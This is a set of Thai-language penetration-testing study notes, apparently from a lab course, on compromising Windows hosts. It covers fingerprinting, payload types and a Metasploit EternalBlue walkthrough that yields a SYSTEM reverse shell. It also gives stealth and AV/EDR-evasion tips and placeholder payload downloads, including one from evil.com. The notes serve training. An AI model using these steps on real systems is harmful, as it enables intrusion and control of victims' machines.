# การเจาะระบบ Windows (Infiltrating Windows)

## บริบทและความสำคัญของ Windows

Microsoft ครองตลาดคอมพิวเตอร์ทั้งในบ้านและองค์กรมาเป็นเวลานาน ในยุคปัจจุบัน พื้นที่โจมตี (Attack Surface) ของ Microsoft ได้เพิ่มขึ้นอย่างมาก เนื่องจาก:

- ฟีเจอร์ Active Directory ที่ดีขึ้น
- การเชื่อมต่อกับ Cloud Services มากขึ้น
- Windows Subsystem for Linux (WSL)
- และอื่นๆ อีกมากมาย

### สถิติช่องโหว่

**ใน 5 ปีที่ผ่านมา:** มีรายงานช่องโหว่ในผลิตภัณฑ์ Microsoft **3,688 รายการ** และตัวเลขนี้เพิ่มขึ้นทุกวัน

## ช่องโหว่ Windows ที่โดดเด่น

| ช่องโหว่ | คำอธิบาย |
|---------|----------|
| **MS08-067** | Patch สำคัญสำหรับหลาย Windows รุ่น เนื่องจากช่องโหว่ใน SMB ทำให้เจาะเข้า Windows ได้ง่ายมาก Conficker worm ใช้ช่องโหว่นี้ติดเชื้อทุก host ที่พบ แม้แต่ Stuxnet ก็ใช้ช่องโหว่นี้ |
| **EternalBlue (MS17-010)** | Exploit ที่รั่วไหลจาก NSA Shadow Brokers ใช้ใน WannaCry ransomware และ NotPetya โจมตีช่องโหว่ใน SMB v1 protocol เชื่อกันว่าติดเชื้อมากกว่า 200,000 hosts ในปี 2017 และยังเป็นวิธีเจาะ Windows ที่นิยมอยู่ |
| **PrintNightmare** | ช่องโหว่ Remote Code Execution ใน Windows Print Spooler ด้วย credentials ที่ถูกต้องหรือ low privilege shell สามารถติดตั้งเครื่องพิมพ์ เพิ่ม driver ที่ทำงานให้เรา และได้รับ system-level access โจมตีหลายบริษัทตลอดปี 2021 |
| **BlueKeep (CVE-2019-0708)** | ช่องโหว่ใน RDP protocol ของ Microsoft ที่อนุญาต Remote Code Execution ใช้ประโยชน์จาก miss-called channel เพื่อได้ code execution กระทบทุก Windows รุ่นตั้งแต่ Windows 2000 ถึง Server 2008 R2 |
| **Sigred (CVE-2020-1350)** | ใช้ช่องโหว่ในวิธีที่ DNS อ่าน SIG resource records ซับซ้อนกว่าช่องโหว่อื่น แต่ถ้าทำสำเร็จจะได้ Domain Admin privileges เพราะกระทบ DNS server ของ domain ซึ่งมักเป็น primary Domain Controller |
| **SeriousSam (CVE-2021-36934)** | Exploit ปัญหาวิธีที่ Windows จัดการ permission ใน `C:\Windows\system32\config` ก่อนแก้ไข ผู้ใช้ที่ไม่ elevated สามารถเข้าถึง SAM database อันตรายเมื่อดูที่ volume shadow copy backups - ผู้โจมตีสามารถอ่าน SAM database และ dump credentials |
| **Zerologon (CVE-2020-1472)** | ช่องโหว่สำคัญที่ exploit ข้อบกพร่องทางการเข้ารหัสใน Active Directory Netlogon Remote Protocol (MS-NRPC) อนุญาตให้ log on เข้า servers ด้วย NTLM และส่งการเปลี่ยนแปลง account ผ่าน protocol โจมตีซับซ้อนแต่ทำได้ง่าย - ผู้โจมตีต้องเดาได้แค่ประมาณ 256 ครั้งสำหรับ computer account password ใช้เวลาเพียงไม่กี่วินาที |

## การระบุและ Fingerprint Windows Hosts

### วิธีที่ 1: การใช้ ICMP และ TTL (Time To Live)

**การตอบสนองจาก Windows hosts:**
- TTL มักเป็น **32 หรือ 128**
- TTL **128 เป็นค่าที่พบบ่อยที่สุด**
- ค่าอาจไม่ตรงทุกครั้ง โดยเฉพาะถ้าไม่ได้อยู่ใน Layer 3 network เดียวกัน

```bash
ping 192.168.86.39

# ผลลัพธ์:
# 64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
# 64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
```

### วิธีที่ 2: การใช้ Nmap สำหรับ OS Detection

**คำสั่ง Nmap พื้นฐาน:**
```bash
sudo nmap -v -O 192.168.86.39
```

**สิ่งที่ Nmap ตรวจสอบ:**
- **OS CPE:** `cpe:/o:microsoft:windows_10`
- **OS details:** `Microsoft Windows 10 1709 - 1909`
- ใช้คุณลักษณะของ TCP/IP stack เทียบกับฐานข้อมูล OS fingerprints

**เคล็ดลับ:**
- หากผลการ scan น้อย ลองใช้ options `-A` และ `-Pn`
- ระวัง: Firewall หรือฟีเจอร์รักษาความปลอดภัยอาจทำให้ผลผิดเพี้ยน
- ควรใช้หลายวิธีในการตรวจสอบ

### วิธีที่ 3: Banner Grabbing

**การใช้ Nmap script:**
```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

**ข้อมูลที่ได้:**
- ตรวจสอบ banner ของแต่ละ port
- ระบุ services และ versions ที่กำลังทำงาน
- เช่น VMWare Workstation, IIS, SMB เป็นต้น

## ประเภทไฟล์ Payload สำหรับ Windows

### 1. DLL (Dynamic Linking Library)

**คำอธิบาย:**
- Library file ที่ให้ shared code และ data แก่หลายโปรแกรมพร้อมกัน
- ทำให้ application มี modularity

**การใช้งานใน Pentesting:**
- DLL Injection เพื่อยกระดับสิทธิ์เป็น SYSTEM
- DLL Hijacking เพื่อ bypass User Account Controls (UAC)

### 2. Batch Files (.bat)

**คำอธิบาย:**
- ไฟล์ text-based DOS scripts
- ใช้โดย system administrators ทำงานอัตโนมัติผ่าน command-line

**การใช้งานใน Pentesting:**
- รันคำสั่งบน host อัตโนมัติ
- เปิด port บน host
- Connect กลับมาที่ attacking box
- Enumeration และส่งข้อมูลกลับมา

### 3. VBS (VBScript)

**คำอธิบาย:**
- Scripting language เบาที่ใช้ Visual Basic ของ Microsoft
- มักใช้เป็น client-side scripting ใน webservers

**การใช้งานใน Pentesting:**
- ใช้ใน Phishing attacks
- หลอกให้ผู้ใช้ enable Macros ใน Excel
- ใช้ Windows scripting engine execute code

**หมายเหตุ:** VBS เก่าและถูกปิดใช้งานใน web browsers สมัยใหม่ส่วนใหญ่

### 4. MSI Files

**คำอธิบาย:**
- Installation database สำหรับ Windows Installer
- เก็บ components และวิธีค้นหาสำหรับการติดตั้ง

**การใช้งานใน Pentesting:**
- สร้าง payload เป็น .msi file
- รัน `msiexec` เพื่อ execute
- ได้รับ elevated reverse shell

### 5. PowerShell

**คำอธิบาย:**
- ทั้ง shell environment และ scripting language
- Shell สมัยใหม่ของ Microsoft
- Dynamic language ที่ใช้ .NET Common Language Runtime
- รับและส่งข้อมูลเป็น .NET objects

**การใช้งานใน Pentesting:**
- มีตัวเลือกมากมายในการได้ shell
- Execute คำสั่งบน host
- ทำงานหลายอย่างในกระบวนการ penetration testing

## เครื่องมือสำหรับสร้าง Payload

| เครื่องมือ | คำอธิบาย |
|-----------|----------|
| **MSFVenom & Metasploit-Framework** | เครื่องมือที่หลากหลายสำหรับ pentester - enumerate hosts, generate payloads, ใช้ exploits, post-exploitation |
| **Payloads All The Things** | แหล่งรวม resources และ cheat sheets สำหรับสร้าง payload |
| **Mythic C2 Framework** | ทางเลือกอื่นแทน Metasploit เป็น C2 Framework |
| **Nishang** | Framework ของ Offensive PowerShell implants และ scripts |
| **Darkarmour** | เครื่องมือสร้างและใช้ obfuscated binaries สำหรับ Windows |

## การถ่ายโอนและ Execute Payload

### โปรโตคอลและเครื่องมือ:

**Impacket:**
- Toolset Python สำหรับโต้ตอบกับ network protocols โดยตรง
- เครื่องมือสำคัญ: psexec, smbclient, wmi, Kerberos, SMB server

**SMB (Server Message Block):**
- ใช้ถ่ายโอนไฟล์ระหว่าง hosts
- เหมาะเมื่อ victim hosts เป็น domain joined
- ใช้ shares เช่น `C$` และ `admin$`

**การ Execute จากระยะไกล:**
- Metasploit มี function build, stage, และ execute payloads อัตโนมัติ

**โปรโตคอลอื่นๆ:**
- FTP, TFTP, HTTP/S
- ใช้อัปโหลดไฟล์ไปยัง host

## ตัวอย่างกระบวนการโจมตี

### ขั้นตอนที่ 1: Enumerate Host

```bash
Watunyoo@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29
```

**ข้อมูลที่ได้:**
- OS: Windows Server 2016 Standard 6.3
- Hostname: SHELLS-WINBLUE
- ไม่ได้อยู่ใน domain
- Services: IIS, SMB, RPC

### ขั้นตอนที่ 2: กำหนดเส้นทางการ Exploit

**ตัวเลือก:**
- IIS web server
- SMB access
- RCE vulnerabilities

**การตรวจสอบ EternalBlue:**
- MS17-010 กระทบ Windows 2008 ถึง Server 2016
- Target อยู่ในช่วงนี้

**ตรวจสอบด้วย Metasploit:**
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```

**ผลลัพธ์:**
```
[+] Host is likely VULNERABLE to MS17-010!
```

### ขั้นตอนที่ 3: เลือก Exploit และ Payload

**เลือก Exploit:**
```bash
search eternal
use exploit/windows/smb/ms17_010_psexec
```

**ตั้งค่า Options:**
```bash
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
```

**Payload:**
- `windows/meterpreter/reverse_tcp`

### ขั้นตอนที่ 4: Execute Attack

```bash
exploit
```

**ผลลัพธ์:**
```
[*] Started reverse TCP handler on 10.10.14.12:4444
[+] Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened
```

**ตรวจสอบ:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### ขั้นตอนที่ 5: เข้าสู่ Shell

**Drop ไปยัง System Shell:**
```bash
meterpreter > shell
```

**ผลลัพธ์:**
```
C:\Windows\system32>
```

# การระบุและเลือกใช้ Shell บน Windows

## การระบุประเภท Shell

### วิธีดูว่าอยู่ใน Shell ไหน:

**CMD (Command Prompt):**
```
C:\Windows\system32>
```
- ไม่มี prefix พิเศษ
- รันคำสั่ง `help` เพื่อยืนยัน

**PowerShell:**
```
PS C:\Windows\system32>
```
- มี `PS` อยู่ด้านหน้า prompt
- บอกว่าอยู่ใน PowerShell session

---

## CMD vs PowerShell - เปรียบเทียบอย่างละเอียด

### CMD (Command Prompt)

**ประวัติและวัตถุประสงค์:**
- Shell MS-DOS ดั้งเดิมที่ติดมากับ Windows
- สร้างมาเพื่อการใช้งานพื้นฐานและงาน IT operations
- Automation ง่ายๆ ทำได้ด้วย batch files

**คุณสมบัติ:**
- ✅ รันคำสั่ง MS-DOS native commands
- ✅ Input/Output เป็น **ข้อความ (Text)**
- ✅ **ไม่เก็บประวัติคำสั่ง** (No command history)
- ✅ ไม่มีปัญหากับ Execution Policy
- ✅ ไม่มีปัญหากับ UAC (User Account Control)
- ✅ มีในทุก Windows versions (รวม Windows XP)

### PowerShell

**ประวัติและวัตถุประสงค์:**
- สร้างมาเพื่อขยายความสามารถของ CMD
- เริ่มมีตั้งแต่ **Windows 7 เป็นต้นไป**

**คุณสมบัติ:**
- ✅ เข้าใจคำสั่ง MS-DOS ทั้งหมดที่ CMD ใช้
- ✅ มีคำสั่งชุดใหม่ที่ใช้ **.NET**
- ✅ รองรับ **cmdlets** (modules เฉพาะทาง)
- ✅ Input/Output เป็น **.NET Objects**
- ⚠️ **เก็บประวัติคำสั่ง** (Command history saved)
- ⚠️ มีปัญหากับ **Execution Policy**
- ⚠️ มีปัญหากับ **UAC**
- ❌ ไม่มีใน Windows XP หรือเก่ากว่า

---

## เมื่อไหร่ควรใช้ CMD?

### ✅ ใช้ CMD เมื่อ:

**1. Host เก่า:**
```
- Windows XP หรือเก่ากว่า
- PowerShell ไม่มีติดตั้ง
```

**2. งานง่าย:**
```
- ต้องการ interaction พื้นฐาน
- เข้าถึง host แบบง่ายๆ
```

**3. เครื่องมือเก่า:**
```bash
# ใช้ batch files
script.bat

# ใช้ net commands
net user
net localgroup
net share

# ใช้ MS-DOS native tools
dir
type
copy
```

**4. ปัญหา Execution Policy:**
```
- เมื่อ Execution Policy อาจขัดขวาง
- ไม่สามารถรัน scripts ใน PowerShell
```

**5. ต้องการความลับ (Stealth):**
```
✅ CMD ไม่เก็บประวัติคำสั่ง
✅ ทิ้งร่องรอยน้อยกว่าบน host
✅ ยากต่อการตรวจจับ
```

---

## เมื่อไหร่ควรใช้ PowerShell?

### ✅ ใช้ PowerShell เมื่อ:

**1. ใช้ Cmdlets:**
```powershell
Get-Process
Get-Service
Invoke-WebRequest
Get-ADUser
```

**2. Custom Scripts:**
```powershell
# PowerShell scripts (.ps1)
.\exploit.ps1
Import-Module CustomModule
```

**3. ทำงานกับ .NET Objects:**
```powershell
# Object manipulation
$users = Get-ADUser -Filter *
$users | Where-Object {$_.Enabled -eq $true}
```

**4. Stealth ไม่สำคัญ:**
```
⚠️ PowerShell เก็บประวัติ
⚠️ ทิ้งร่องรอยมากกว่า
⚠️ ตรวจจับได้ง่ายกว่า
```

**5. Cloud Services:**
```powershell
# Azure, AWS, O365
Connect-AzAccount
Get-AzVM
```

**6. ใช้ Aliases:**
```powershell
# Set aliases
Set-Alias -Name ll -Value Get-ChildItem
ll
```

---

## ตารางเปรียบเทียบ

| คุณสมบัติ | CMD | PowerShell |
|-----------|-----|------------|
| **Input/Output** | Text | .NET Objects |
| **ประวัติคำสั่ง** | ❌ ไม่เก็บ | ✅ เก็บ |
| **Stealth** | ✅ ดีกว่า | ⚠️ แย่กว่า |
| **Scripting** | Batch files (จำกัด) | Scripts ทรงพลัง |
| **Execution Policy** | ❌ ไม่มีปัญหา | ⚠️ อาจมีปัญหา |
| **UAC** | ❌ ไม่กระทบ | ⚠️ กระทบ |
| **รองรับ OS** | ทุก Windows | Windows 7+ |
| **Cmdlets** | ❌ ไม่รองรับ | ✅ รองรับ |
| **Cloud Integration** | ❌ ไม่มี | ✅ มี |
| **Learning Curve** | ง่าย | ยากกว่า |

---

## WSL (Windows Subsystem for Linux)

### คืออะไร?
- สภาพแวดล้อม Linux เสมือนที่ติดตั้งใน Windows
- เครื่องมือใหม่ที่มีศักยภาพสูง

### ความเสี่ยงด้านความปลอดภัย:

**🔴 จุดอ่อนสำคัญ:**

1. **ไม่ถูกตรวจสอบโดย Windows Firewall:**
   ```
   - Network requests จาก WSL ไม่ถูก parse
   - Windows Firewall มองไม่เห็น
   ```

2. **Windows Defender มองไม่เห็น:**
   ```
   - Network functions ไม่ถูกตรวจสอบ
   - เป็นจุดบอด (blind spot) ของ host
   ```

3. **Malware ใช้ประโยชน์:**
   ```python
   # Malware ใช้ Python3 และ Linux binaries
   # ดาวน์โหลดและติดตั้ง payloads ผ่าน WSL
   ```

4. **หลีกเลี่ยงการตรวจจับ:**
   ```
   ✅ หลีกเลี่ยง AV (Antivirus)
   ✅ หลีกเลี่ยง EDR (Endpoint Detection and Response)
   ```

### ตัวอย่างการโจมตี:

```bash
# ใน WSL instance
python3 download_payload.py
./linux_binary --install-malware

# Windows Defender ไม่เห็น!
# Windows Firewall ไม่บล็อก!
```

---

## PowerShell Core บน Linux

### คืออะไร?
- PowerShell ที่ติดตั้งบน Linux OS ได้
- นำ PowerShell functions มาใช้บน Linux

### ความเสี่ยง:

**🔴 ปัญหาคล้าย WSL:**

1. **หลีกเลี่ยงการตรวจจับ:**
   ```
   ✅ หลีกเลี่ยง AV detection
   ✅ หลีกเลี่ยง EDR mechanisms
   ```

2. **ข้อมูลยังจำกัด:**
   ```
   - ยังไม่มีการศึกษามาก
   - Vector ของการโจมตียังไม่เป็นที่รู้จัก
   - วิธีป้องกันยังไม่ชัดเจน
   ```

3. **Cross-platform Attacks:**
   ```powershell
   # ใช้ PowerShell บน Linux
   # โจมตี Windows hosts
   Invoke-WebRequest -Uri "http://evil.com/payload"
   ```

---

